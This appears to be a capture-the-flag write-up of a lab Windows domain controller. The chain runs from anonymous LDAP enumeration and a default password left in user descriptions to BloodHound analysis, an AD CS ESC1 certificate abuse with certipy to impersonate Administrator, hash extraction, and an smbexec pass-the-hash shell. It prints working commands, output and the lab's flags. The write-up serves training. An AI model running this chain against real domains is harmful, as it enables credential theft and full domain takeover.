
# PORT SCAN
---


| PORT      | SERVICE       |
| --------- | ------------- |
| 53/tcp    | domain        |
| 80/tcp    | http          |
| 88/tcp    | kerberos-sec  |
| 135/tcp   | msrpc         |
| 139/tcp   | netbios-ssn   |
| 389/tcp   | ldap          |
| 443/tcp   | ssl/http      |
| 445/tcp   | microsoft-ds  |
| 464/tcp   | kpasswd5      |
| 593/tcp   | ncacn_http    |
| 636/tcp   | ssl/ldap      |
| 3268/tcp  | ldap          |
| 3269/tcp  | ssl/ldap      |
| 3389/tcp  | ms-wbt-server |
| 9389/tcp  | mc-nmf        |
| 47001/tcp | http          |
| 49664/tcp | msrpc         |
| 49665/tcp | msrpc         |
| 49666/tcp | msrpc         |
| 49667/tcp | msrpc         |
| 49669/tcp | msrpc         |
| 49670/tcp | ncacn_http    |
| 49671/tcp | msrpc         |
| 49675/tcp | msrpc         |
| 49676/tcp | msrpc         |
| 49683/tcp | msrpc         |
| 49701/tcp | msrpc         |
| 49711/tcp | msrpc         |
| 49716/tcp | msrpc         |


# RECONNAISSANCE
---

We need to add the dc and domain to `/etc/hosts` first:

```bash
echo '10.10.148.131 labyrinth.thm.local thm.local' | sudo tee -a /etc/hosts
```

We got a bunch of open ports as common on windows machines, let's try some basic enumerations, since we don't have initial credentials, we need to test anonymous enumeration:

```bash
smbclient -L //10.10.148.131 -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

Nothing interesting, let's proceed with ldap:

```
ldapsearch -x -H ldap://10.10.148.131 -b "DC=thm,DC=local" -s base "(objectClass=*)"
# extended LDIF
#
# LDAPv3
# base <DC=thm,DC=local> with scope baseObject
# filter: (objectClass=*)
# requesting: ALL
#

# thm.local
dn: DC=thm,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=thm,DC=local
instanceType: 5
whenCreated: 20230512072440.0Z
whenChanged: 20250624003404.0Z
subRefs: DC=ForestDnsZones,DC=thm,DC=local
subRefs: DC=DomainDnsZones,DC=thm,DC=local
subRefs: CN=Configuration,DC=thm,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAzIq23BrAck2BE8AI/Pqy+g==
uSNChanged: 163879
name: thm
objectGUID:: uJV0oyUyQUCfgYWXQdbMjA==
creationTime: 133951988448313360
forceLogoff: -9223372036854775808
lockoutDuration: -6000000000
lockOutObservationWindow: -6000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1008
pwdProperties: 0
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAAKeA2dTgJ371Q0KEA
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=thm,DC=local
fSMORoleOwner: CN=NTDS Settings,CN=LABYRINTH,CN=Servers,CN=Default-First-Site-
 Name,CN=Sites,CN=Configuration,DC=thm,DC=local
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=thm,
 DC=local
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=thm,DC=local
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=thm
 ,DC=local
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=thm,DC=local
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 thm,DC=local
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=t
 hm,DC=local
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=thm
 ,DC=local
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=thm,DC=lo
 cal
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=thm,DC=local
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=thm,DC
 =local
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=thm,DC=loc
 al
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=thm,DC=local
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=thm,DC=local;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=thm,DC
 =local
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=thm,DC=local
masteredBy: CN=NTDS Settings,CN=LABYRINTH,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=thm,DC=local
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=LABYRINTH,CN=Servers,CN=Default-First-Sit
 e-Name,CN=Sites,CN=Configuration,DC=thm,DC=local
msDS-IsDomainFor: CN=NTDS Settings,CN=LABYRINTH,CN=Servers,CN=Default-First-Si
 te-Name,CN=Sites,CN=Configuration,DC=thm,DC=local
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: thm

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Ldap anonymous enumeration works, let's dump full ldap scan:

```
ldapsearch -x -H ldap://10.10.148.131 -b "DC=thm,DC=local" > ldap_dump.txt
```

We get a ton of information on here, we can search for the users and many more information of the domain, since it would be a hassle to go through every user and copy it, we can use `nxc` to give us the users:

```
nxc ldap labyrinth.thm.local -u 'guest' -p '' --users > users.txt
```

We got `487` domain users:

![Pasted image 20250623195453.png](../../IMAGES/Pasted%20image%2020250623195453.png)

Interesting part on here is that two users have this description:


![Pasted image 20250623195543.png](../../IMAGES/Pasted%20image%2020250623195543.png)

Let's begin exploitation.


# EXPLOITATION
---

We got two sets of possible credentials:

```
IVY_WILLIS:CHANGEME2023!
SUSANNA_MCKNIGHT:CHANGEME2023!
```

Let's test them with `nxc` again:

```
nxc smb labyrinth.thm.local -u 'IVY_WILLIS' -p 'CHANGEME2023!' 
nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' 
```


![Pasted image 20250623195817.png](../../IMAGES/Pasted%20image%2020250623195817.png)

Both work for `smb`, `winrm` is not enabled on this machine but we got `rdp`, let's test for rdp then:

```
nxc rdp labyrinth.thm.local -u 'IVY_WILLIS' -p 'CHANGEME2023!' 
nxc rdp labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' 
```

![Pasted image 20250623195958.png](../../IMAGES/Pasted%20image%2020250623195958.png)


We know that Susanna can rdp, first of all, let's use bloodhound to check any PE path:

```python
bloodhound-python -d thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -ns 10.10.148.131 -c All --zip
```


As always, if you already ingested data, you can clean up all data on `neo4j` using:

```cypher
MATCH (n)
DETACH DELETE n
```

Now, let's check up the data on bloodhound:

![Pasted image 20250624140039.png](../../IMAGES/Pasted%20image%2020250624140039.png)

Sussana is member of `remote desktop users` as we know, important stuff comes here, if we check the relations of `users@thm.local`, we can find this:

![Pasted image 20250624140227.png](../../IMAGES/Pasted%20image%2020250624140227.png)


![Pasted image 20250624140309.png](../../IMAGES/Pasted%20image%2020250624140309.png)

We have a relation with `Certificate Service DCOM Access` group, which means we can interact with AD CS, meaning that if we find a misconfigured certificate, we can get an admin session, we can test this by going into rdp and checking which groups we are part of:

```bash
xfreerdp /v:labyrinth.thm.local /u:'SUSANNA_MCKNIGHT' /p:'CHANGEME2023!' /dynamic-resolution /clipboard /cert:ignore
```

![Pasted image 20250624140904.png](../../IMAGES/Pasted%20image%2020250624140904.png)

Now, let's check:

![Pasted image 20250624140937.png](../../IMAGES/Pasted%20image%2020250624140937.png)

As seen, we can find the certificate groups, let's begin privilege escalation.



# PRIVILEGE ESCALATION
---

First of all, we need to check which certificate may be vulnerable, to do this we'll be using `certipy`, if you don't have certipy-ad you can install it with:

```python
pip install certipy-ad
```

Now, let's begin, first of all let's check the vulnerable certificate:

```python
certipy find -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -target labyrinth.thm.local -stdout -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: labyrinth.thm.local.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'thm-LABYRINTH-CA' via RRP
[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-12T08:55:40+00:00
    Template Last Modified              : 2023-05-12T08:55:40+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Full Control Principals         : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Property Enroll           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : THM.LOCAL\Domain Computers
                                          THM.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

We find there's a `ESC1` vulnerability on the `ServerAuth` certificate template, we can refer to this article to check how to exploit certificate vulnerabiltiies:

ARTICLE: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

![Pasted image 20250624141454.png](../../IMAGES/Pasted%20image%2020250624141454.png)

![Pasted image 20250624141526.png](../../IMAGES/Pasted%20image%2020250624141526.png)

![Pasted image 20250624141549.png](../../IMAGES/Pasted%20image%2020250624141549.png)

Basically, what we'd need to do is to request a certificate on behalf of the Administrator user, then, using that certificate, we'll be able to get a session as the admin user.

Based on the article, we need to do:

```python
certipy req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local
```

Before doing that, we need to use `ntpdate` to match our time with the target in case it fails:

```
sudo ntpdate -u IP
```

Now, let's request the certificate:

```python
certipy req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: labyrinth.thm.local.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: THM.LOCAL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@thm.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

We got it, we can now proceed to authenticate with it to get our hash for administrator:

```python
certipy auth -pfx administrator.pfx -domain thm.local -dc-ip IP

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@thm.local 
[*] Trying to get TGT... 
[*] Got TGT 
[*] Saved credential cache to 'administrator.ccache' 
[*] Trying to retrieve NT hash for 'administrator' 
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
```


We got our hash, we can finally use `smbexec.py` to authenticate using the hash:

```python
python3 smbexec.py -k -hashes :07d677a6cf40925beb80ad6428752322 THM.LOCAL/Administrator@labyrinth.thm.local

[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

![Pasted image 20250624144621.png](../../IMAGES/Pasted%20image%2020250624144621.png)

We can finally get both flags and end the CTF:

```PYTHON
C:\Windows\system32>type C:\Users\SUSANNA_MCKNIGHT\Desktop\user.txt
THM{ENUMERATION_IS_THE_KEY}

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
THM{THE_BYPASS_IS_CERTIFIED!}
```



![Pasted image 20250623203625.png](../../IMAGES/Pasted%20image%2020250623203625.png)


